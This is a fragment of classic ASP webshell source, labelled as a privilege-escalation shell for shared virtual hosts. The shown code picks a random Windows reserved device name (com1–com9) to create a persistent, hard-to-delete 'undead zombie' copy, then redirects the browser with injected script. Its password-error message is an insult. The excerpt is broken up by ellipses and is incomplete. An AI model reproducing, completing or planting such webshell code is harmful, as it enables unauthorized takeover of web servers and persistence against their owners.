...
'------------------------内部测试 版----------------------
mmname   ="虚拟主机提权专用Webshell去后门版"  'shell标题
mmshell ="虚拟主机提权专用Webshell 80sec出品" 'shell版权
errout ="傻逼与狗勿猜解本人密码" '密码错误提示
...
if instr(url,lcase("com"))>0 then
response.redirect url
else
fpath=request.servervariables("path_translated")
set fso=server.createobject("scripting.filesystemobject")
pex="com1|com2|com3|com4|com5|com6|com7|com8|com9"
rndpex=split(pex,"|")(rndnumber(0,8))
session("seljw")=""
...
set fso=nothing
RRS"<br><br><br><br><br><br><center>不死僵尸创建中,切勿关闭此页面......</center>"
RRS"<script>window.location='http://"&request("server_name")&url2&"';</script>"
end if
else
